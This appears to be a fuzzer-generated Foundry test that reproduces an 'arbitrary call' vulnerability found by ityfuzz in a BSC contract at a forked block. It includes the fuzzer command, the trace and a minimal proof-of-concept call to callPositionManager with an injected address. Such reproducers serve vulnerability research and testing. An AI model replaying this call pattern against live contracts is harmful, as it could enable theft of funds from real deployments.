// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x55d398326f99059fF775485246999027B3197955,0x7BA5dd9Bb357aFa2231446198c75baC17CEfCda9,0x13f4EA83D0bd40E75C8222255bc855a974568Dd4,0x5542958FA9bD89C96cB86D1A6Cb7a3e644a3d46e,0x98e241bd3be918e0d927af81b430be00d86b04f9,0x7ba5dd9bb357afa2231446198c75bac17cefcda9 -c bsc --onchain-block-number 29228410 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Arbitrary call from "0x13f4ea83d0bd40e75c8222255bc855a974568dd4" to 0x46a15b0b27311cedf172ab29e4f4766fbe7f4364
================ Trace ================
   │  │  │  [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   │  │  │  │  ├─[5] 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4.callPositionManager{value: 5174559692489281.2657 Ether}(0x6768bf15ff805291e77667fe01ff6401eb0f4867)
   │  │  │  │  │  │  └─ ← ()
   │  │  │  │  └─ ← ()
   │  │  └─ ← ()


 */

contract C55d3 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 29228410);
    }

    function test() public {

        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 5174559692489281265767592899903488);
        0x13f4EA83D0bd40E75C8222255bc855a974568Dd4.call{value: 5174559692489281265767592899903488}(abi.encodeWithSignature(
            "callPositionManager(bytes)",0x6768bf15ff805291e77667fe01ff6401eb0f4867
        )); 
    }

    // Stepping with return
    receive() external payable {}
}

